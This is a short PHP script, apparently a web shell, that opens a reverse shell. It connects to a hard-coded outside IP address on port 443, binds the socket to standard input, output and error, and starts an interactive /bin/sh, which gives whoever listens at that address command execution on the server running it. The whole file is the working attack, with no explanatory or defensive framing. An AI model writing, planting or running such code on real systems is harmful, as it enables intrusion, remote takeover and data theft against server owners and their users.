<?php
$ip = "45.76.160.49";
$port = 443;

$socket = fsockopen($ip, $port);

if ($socket) {
$descriptorspec = array(
0 => $socket, // stdin
1 => $socket, // stdout
2 => $socket  // stderr
);

proc_open("/bin/sh -i", $descriptorspec, $pipes);
}
?>
